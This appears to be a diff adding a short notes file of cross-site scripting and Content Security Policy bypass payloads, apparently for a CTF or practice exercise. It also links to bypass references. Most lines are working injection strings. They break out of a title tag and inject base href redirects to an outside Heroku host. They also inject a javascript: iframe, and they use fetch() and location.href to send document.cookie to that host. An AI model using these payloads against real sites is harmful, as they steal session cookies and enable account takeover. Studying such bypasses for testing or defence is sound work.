@@ -1,0 +1,11 @@
+https://book.hacktricks.xyz/pentesting-web/content-security-policy-csp-bypass
+https://csp-evaluator.withgoogle.com/
+
+</title><base href="https://immense-ocean-93307.herokuapp.com/"><title>
+</title><base href="http://localhost:5000"><script src="/security.js" nonce></script><title>
+
+</title><base href="http://localhost:5000" /><meta http-equiv="Content-Security-Policy" content="frame-src 'unsafe-inline' 'unsafe-hashes'"/><iframe src="javascript:alert(0)"></iframe><title>
+
+alert(`//immense-ocean-93307.herokuapp.com/?${document.cookie}`);fetch(`//immense-ocean-93307.herokuapp.com/?${document.cookie}`)//</title><script id="message"></script><img src="
+
+location.href=`https://immense-ocean-93307.herokuapp.com/?${document.cookie}`//</title><script id="message"></script><script>
